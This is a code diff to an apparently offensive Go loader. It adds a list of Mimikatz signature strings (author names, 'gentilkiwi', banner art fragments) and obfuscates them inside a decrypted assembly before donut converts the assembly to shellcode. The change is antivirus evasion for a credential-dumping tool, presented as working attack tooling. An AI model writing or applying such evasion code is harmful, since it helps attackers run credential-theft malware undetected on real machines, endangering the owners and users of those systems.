@@ -47,6 +47,26 @@ func versionFunc() string {
 
 func main() {
 
+
+	blacklist := []string{
+		"mimikatz",
+		"delpy",
+		"benjamin",
+		"delpy",
+		"vincent",
+		"le toux",
+		"letoux",
+		"amour",
+		"la vie",
+		"gentilkiwi",
+		"kiwi",
+		"creativecommons",
+		".#####.",
+		".####.",
+		".## ^ ##.",
+		"## v ##",
+	}
+
 	entropy := 3
 
 	//  -PIC/SHELLCODE OPTIONS-
@@ -126,6 +146,8 @@ func main() {
 	 */
 
 	assemblyBytes := decrypt(assemblyBytesci,key)
+
+	assemblyBytes = loader.ObfuscateStrings(assemblyBytes,blacklist)
 
 	payload, err := donut.ShellcodeFromFile(config, assemblyBytes)
 	if err == nil {
